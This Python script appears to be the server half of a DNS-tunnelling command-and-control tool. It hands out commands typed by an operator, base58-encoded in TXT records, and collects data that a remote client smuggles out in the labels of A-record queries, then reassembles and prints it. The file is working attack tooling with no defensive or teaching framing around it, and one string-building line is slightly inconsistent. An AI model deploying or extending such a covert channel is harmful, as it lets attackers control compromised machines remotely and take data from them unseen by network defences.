from dnslib import RR
from dnslib.server import DNSServer, BaseResolver, DNSLogger
import argparse
import queue
import struct
import base58

domain = "example.com"
q_commands = queue.Queue()


class TunnelResolver(BaseResolver):
    def __init__(self):
        self.__is_receiving = False
        self.__seq_num = -1
        self.__buffer = {}

    def resolve(self, request, handler):
        reply = request.reply()
        qname = request.q.qname
        cc_record = "cmd." + domain + "."
        qstr = str(qname)
        if qstr == cc_record:
            try:
                command_txt = q_commands.get(block=False, timeout=None)
            except queue.Empty:
                command_txt = ""
            reply.add_answer(*RR.fromZone("{} 60 IN TXT \"{}\"".format(qname, base58.b58encode(command_txt.encode("utf-8")).decode("ascii"))))
        elif request.q.qtype == 1 and ("out." + domain + ".") in qstr:
            self.__parse_out(qstr)
            reply.add_answer(*RR.fromZone("{} 3600 IN A {}".format(qname, "127.255.255.255")))
        return reply

    """
    Parse the response for the client
    They are blocks of 32 bytes per level with a maximum of 3 level. The data is encoded in 
    the response using base58. The two first bytes are used as the seq number. The Msb bit 
    for the first byte is used to indicate that this is the last packet for the response.
    """
    def __parse_out(self, request):
        self.__is_receiving = True

        top_level = "out" + domain + "."
        data_str = request[:-(len(top_level)+1)]
        data_block = list(filter(None, data_str.split(".")))

        seq_num = 0
        correct_order = False
        response_buffer = []
        for i, block in enumerate(data_block):
            # Base58 decode
            block_decoded = base58.b58decode(block)
            if i == 0:
                last_packet, seq_num, data = self.__parse_first_block(block_decoded)
                if last_packet:
                    self.__is_receiving = False

                if self.__seq_num == (seq_num - 1):
                    # The order is expected
                    correct_order = True
                self.__seq_num = seq_num
            else:
                data = block_decoded
            response_buffer.append(data)

        response = b''.join(response_buffer)
        self.__buffer[seq_num] = response

        if not self.__is_receiving:
            self.__flush()

    @staticmethod
    def __parse_first_block(block):
        data = block[2:]
        control_byte = block[0]

        seq_num_byte = bytearray(block[0:2])
        seq_num_byte[0] &= 0x7F
        seq_num = struct.unpack(">H", seq_num_byte)[0]

        return bool(control_byte & 0x80), seq_num, data

    def __flush(self):
        missing_packet = False
        for i in range(self.__seq_num+1):
            if i in self.__buffer:
                print(self.__buffer[i].decode("ascii"), end="")
            else:
                missing_packet = True

        if missing_packet:
            print("[!] Some packets are missing!")
        self.__buffer = {}

p = argparse.ArgumentParser(description="Fixed DNS Resolver")
p.add_argument("--port", "-p", type=int, default=53,
               metavar="<port>",
               help="Server port (default:53)")
p.add_argument("--address", "-a", default="",
               metavar="<address>",
               help="Listen address (default:all)")
p.add_argument("--udplen", "-u", type=int, default=0,
               metavar="<udplen>",
               help="Max UDP packet length (default:0)")
p.add_argument("--tcp", action='store_true', default=False,
               help="TCP server (default: UDP only)")
p.add_argument("--log", default="truncated,error",
               help="Log hooks to enable (default: +request,+reply,+truncated,+error,-recv,-send,-data)")
p.add_argument("--log-prefix", action='store_true', default=False,
               help="Log prefix (timestamp/handler/resolver) (default: False)")

args = p.parse_args()
resolver = TunnelResolver()
logger = DNSLogger(args.log, args.log_prefix)

print("Starting Tunnel Resolver (%s:%d) [%s]" % (
    args.address or "*",
    args.port,
    "UDP/TCP" if args.tcp else "UDP"))

udp_server = DNSServer(resolver,
                       port=args.port,
                       address=args.address,
                       logger=logger)
udp_server.start_thread()

if args.tcp:
    tcp_server = DNSServer(resolver,
                           port=args.port,
                           address=args.address,
                           tcp=True,
                           logger=logger)
    tcp_server.start_thread()

while udp_server.isAlive():
    command = input()
    if len(command) <= 255 and len(command) > 0:
        q_commands.put(command)
